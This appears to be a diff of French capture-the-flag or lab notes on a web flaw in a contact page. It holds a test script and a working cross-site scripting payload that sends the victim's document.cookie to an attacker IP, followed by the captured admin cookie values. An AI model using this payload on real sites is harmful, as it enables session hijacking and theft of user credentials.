@@ -12,7 +12,7 @@
 4/ Test Web :
 	faille web -> page de contact ->
 			<script>alert(1)</script>
-	Payload : <script>var myimg = new Image(); myimg.src = 'http://10.10.16.6/q?=' + document.cookie;</script>
+	Payload : <script>var myimg = new Image(); myimg.src = 'http://10.10.16.3/q?=' + document.cookie;</script>
 
 	On ajoute les cookies :	LANG=EN_US;%20SINCE=1667840531;%20LIMIT=10;%20DOMAIN=admin
 
